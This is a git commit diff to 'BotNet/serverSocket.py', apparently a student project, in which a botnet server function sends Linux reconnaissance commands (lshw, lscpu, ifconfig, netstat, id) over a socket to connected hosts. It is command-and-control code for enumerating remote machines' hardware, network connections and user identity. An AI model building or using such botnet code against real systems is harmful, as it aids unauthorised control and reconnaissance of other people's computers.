18a475b716ab12ce976a16f8419efc9b5ea2f0b2
SiMiezz <simone.giordano5@studenti.unina.it>
2022-11-10 12:51:07 +0100

    setup linux

--- BotNet/serverSocket.py
+++ BotNet/serverSocket.py
@@ -30,11 +30,12 @@ def setup_windows(connectionSocket):
 
 
 def setup_Linux(connectionSocket):
-    connectionSocket.send("".encode(encoding='latin-1'))
-    connectionSocket.send("".encode(encoding='latin-1'))
-    connectionSocket.send("".encode(encoding='latin-1'))
-    connectionSocket.send("".encode(encoding='latin-1'))
-    connectionSocket.send("".encode(encoding='latin-1'))
+    connectionSocket.send("lshw".encode(encoding='latin-1'))
+    connectionSocket.send("lscpu".encode(encoding='latin-1'))
+    connectionSocket.send("ifconfig".encode(encoding='latin-1'))
+    connectionSocket.send("netstat -t".encode(encoding='latin-1'))
+    connectionSocket.send("netstat -u".encode(encoding='latin-1'))
+    connectionSocket.send("id".encode(encoding='latin-1'))
 
 
 
